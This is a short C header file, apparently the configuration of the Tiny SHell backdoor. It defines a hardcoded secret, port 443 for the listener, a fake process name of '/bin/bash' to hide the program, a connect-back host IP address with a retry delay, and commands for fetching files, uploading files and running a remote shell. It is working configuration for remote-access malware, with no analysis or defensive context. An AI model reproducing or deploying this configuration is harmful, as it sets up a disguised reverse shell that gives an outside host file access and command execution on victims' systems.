#ifndef _TSH_H
#define _TSH_H

char *secret = "mmmfffmmxx99";

#define SERVER_PORT 443
#define FAKE_PROC_NAME "/bin/bash"

#define CONNECT_BACK_HOST  "194.113.172.136"
#define CONNECT_BACK_DELAY 300

#define GET_FILE 1
#define PUT_FILE 2
#define RUNSHELL 3

#endif /* tsh.h */
